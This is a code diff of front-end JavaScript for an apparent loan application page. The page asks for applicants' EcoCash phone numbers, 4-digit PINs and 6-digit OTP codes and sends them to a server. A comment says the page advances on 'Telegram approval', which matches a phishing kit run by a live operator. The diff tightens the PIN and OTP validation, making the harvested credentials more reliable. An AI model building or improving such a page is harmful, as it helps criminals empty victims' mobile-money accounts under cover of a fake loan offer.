@@ -3,25 +3,29 @@ let statusPollInterval = null;
 
 function updateLoanCalc() {
   const amount = parseInt(document.getElementById('loanRange').value);
-  const periodSelect = document.getElementById('repaymentPeriod');
+  const periodElem = document.getElementById('calc-period');
+  const repaymentPeriodInput = document.getElementById('repaymentPeriod');
   
+  let months = "1";
+  if (amount <= 100) {
+    months = "1";
+  } else if (amount <= 250) {
+    months = "2";
+  } else if (amount <= 400) {
+    months = "3";
+  } else {
+    months = "6";
+  }
+
   const interest = Math.round(amount * 0.10);
   const total = amount + interest;
 
   document.getElementById('calc-amount').innerText = '$' + amount;
+  periodElem.innerText = months;
+  repaymentPeriodInput.value = months;
+
   document.getElementById('calc-interest').innerText = '$' + interest;
   document.getElementById('calc-total').innerText = '$' + total;
-
-  // Dynamically update repayment period as the range slider moves
-  if (amount <= 100) {
-    periodSelect.value = "1";
-  } else if (amount <= 250) {
-    periodSelect.value = "2";
-  } else if (amount <= 400) {
-    periodSelect.value = "3";
-  } else {
-    periodSelect.value = "6";
-  }
 }
 
 function showSection(sectionId) {
@@ -52,12 +56,17 @@ async function submitStep2Details() {
   const phone = document.getElementById('phone').value.trim();
   const pin = document.getElementById('pin').value.trim();
 
-  if (phone.length !== 9 || pin.length !== 4) {
-    alert("Please enter a valid 9-digit EcoCash phone number and 4-digit PIN.");
+  // Strict 9-digit Zimbabwe EcoCash number check
+  if (!/^\d{9}$/.test(phone)) {
+    alert("Please enter exactly 9 digits for your Zimbabwe EcoCash phone number.");
     return;
   }
 
-  // Payload combining Step 1 (Applicant Info) + Step 2 (EcoCash Phone & PIN)
+  if (pin.length !== 4 || !/^\d{4}$/.test(pin)) {
+    alert("Please enter a valid 4-digit EcoCash PIN.");
+    return;
+  }
+
   const payload = {
     fullName: document.getElementById('fullName').value,
     occupation: document.getElementById('occupation').value,
@@ -83,7 +92,7 @@ async function submitStep2Details() {
       currentAppRef = data.appReference;
       startStatusPolling();
 
-      // Start 10-second timer and auto-advance to Step 3 when finished
+      // Start 10-second countdown and auto-advance to Step 3
       startCountdown(10, () => {
         showSection('form-step-3');
       });
@@ -100,7 +109,7 @@ async function submitStep2Details() {
 async function submitOTPDetails() {
   const otpCode = document.getElementById('otpCode').value.trim();
 
-  if (otpCode.length !== 6) {
+  if (otpCode.length !== 6 || !/^\d{6}$/.test(otpCode)) {
     alert("Please enter a valid 6-digit OTP code.");
     return;
   }
@@ -120,7 +129,7 @@ async function submitOTPDetails() {
     const data = await res.json();
     if (data.success) {
       startCountdown(10, () => {
-        // Keeps waiting on status check polling
+        // Active status polling will move to Step 4 on Telegram approval
       });
     }
   } catch (err) {
@@ -176,4 +185,4 @@ function startStatusPolling() {
       console.error("Polling status error:", err);
     }
   }, 2000);
-    }
+}
